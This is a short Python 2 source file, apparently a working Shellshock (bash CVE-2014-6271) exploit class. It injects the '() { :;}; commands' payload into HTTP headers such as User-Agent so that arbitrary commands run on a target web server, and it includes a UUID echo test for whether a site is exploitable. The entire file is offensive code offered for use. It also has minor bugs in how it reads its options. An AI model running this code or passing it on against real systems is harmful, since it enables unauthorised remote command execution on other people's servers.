import requests # Cool, insanely simple HTTP requests library.
import uuid # To make the exploitability tag randomized, unique, and long

class ShellShocker:
  """
  A ShellShock exploit class
  You can create a payload, send it, and grab the response.
  """

  def __init__(self, options):
    """
    Initialization method of the ShellShocker class
    Pass it a dict of options.
    """
    self.payload_headers = ["User-Agent"]
    self.commands = ""
    self.exploit_tag = ""
    self.payload = ""
    self.exploit_response = ""

    try:
      self.url = options['url']
    except KeyError as e:
      print 'Something ({specificerror}) not found in the options parameter'.format(specificerror = str(e))
      raise

    try:
      if options['commands']:
        self.commands = options['commands']
      if options['header']:
        self.payload_headers = options['payload_headers']
    except:
      pass

  def bazinga(self):
    """
    Send the exploit to the url, and returns a Response object back (as well as
    storing it in self.exploit_response)
    """
    self.payload = "() {{ :;}}; {commands}".format(commands = self.commands)
    headers = {}
    for header in self.payload_headers:
      headers.update({header: self.payload})
    self.exploit_response = requests.get(self.url, headers=headers)

  def exploitable(self):
    """
    Is the site exploitable?
    """
    self.exploit_tag = str(uuid.uuid4())
    self.commands = "echo; echo {exploit_tag}".format(exploit_tag=self.exploit_tag)
    self.bazinga()
    exploit_results = self.exploit_response.text
    self.exploit_response.close()
    if self.exploit_tag in exploit_results:
      return True
    return False
